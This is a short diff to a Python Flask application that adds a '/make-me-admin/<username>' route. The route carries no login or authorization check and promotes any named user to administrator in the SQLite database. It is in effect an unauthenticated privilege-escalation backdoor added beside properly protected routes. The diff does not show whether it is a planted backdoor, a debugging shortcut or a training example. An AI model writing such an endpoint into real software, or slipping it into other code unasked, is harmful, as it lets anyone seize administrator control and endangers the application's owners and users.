@@ -224,3 +224,15 @@ def admin():
 @login_required
 def home():
     return render_template("index.html", user=current_user.id)
+
+@app.route("/make-me-admin/<username>")
+def make_admin(username):
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute("UPDATE users SET role = 'admin' WHERE username = ?", (username,))
+        conn.commit()
+        conn.close()
+        return f"✅ User {username} is now an ADMIN!"
+    except Exception as e:
+        return f"❌ Error: {e}"
